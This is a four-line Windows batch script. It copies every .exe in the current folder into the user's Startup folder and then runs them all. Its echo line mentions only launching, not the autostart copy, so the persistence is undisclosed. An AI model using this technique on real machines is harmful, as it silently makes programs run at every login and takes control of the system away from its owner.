@echo off
copy *.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo launching scripts now (close terminal to exit)
for %%f in (*.exe) do %%f
